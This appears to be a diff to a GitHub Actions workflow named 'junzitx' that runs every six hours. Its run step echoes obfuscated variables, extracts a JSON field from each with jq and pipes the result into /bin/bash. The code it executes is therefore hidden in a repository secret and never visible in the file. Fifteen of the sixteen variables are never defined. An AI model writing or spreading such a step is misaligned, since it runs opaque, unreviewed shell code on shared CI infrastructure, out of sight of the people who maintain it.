@@ -1,25 +1,32 @@
 name: junzitx
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 0/6 * * *'
+    - cron: '38 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: junzitx
         env:
-          dhb85: ${{ secrets.dhb85 }}
+          erp0018: ${{ secrets.erp0018 }}
         run: |
-          echo $dhb85 | jq -r .lot48 | /bin/bash
-          echo $z4 | jq -r .d451 | /bin/bash
-          echo $vx89591 | jq -r .x922 | /bin/bash
-          echo $cme2479 | jq -r .uxhbv682 | /bin/bash
-          echo $xl2 | jq -r .z144 | /bin/bash
-          echo $hu19266 | jq -r .la601 | /bin/bash
-          echo $l111 | jq -r .vu3 | /bin/bash
-          echo $mfi1 | jq -r .n062 | /bin/bash
-          echo $w4112 | jq -r .gvq96593 | /bin/bash
+          echo $erp0018 | jq -r .ztjqt4 | /bin/bash
+          echo $qetxu801 | jq -r .v770 | /bin/bash
+          echo $ad4525 | jq -r .etj56206 | /bin/bash
+          echo $hib8 | jq -r .fwnf7 | /bin/bash
+          echo $enph80 | jq -r .s919 | /bin/bash
+          echo $jiaaa8805 | jq -r .fh15 | /bin/bash
+          echo $bwf5452 | jq -r .kgdng28437 | /bin/bash
+          echo $zj10 | jq -r .ngqyv90218 | /bin/bash
+          echo $feogc12 | jq -r .rp97991 | /bin/bash
+          echo $ugp32340 | jq -r .tf8225 | /bin/bash
+          echo $h97 | jq -r .e86 | /bin/bash
+          echo $z89853 | jq -r .rcqu0603 | /bin/bash
+          echo $vlg99 | jq -r .f5131 | /bin/bash
+          echo $xo999 | jq -r .r351 | /bin/bash
+          echo $jfk8990 | jq -r .jwyo9166 | /bin/bash
+          echo $iyb61 | jq -r .cmm57746 | /bin/bash
 
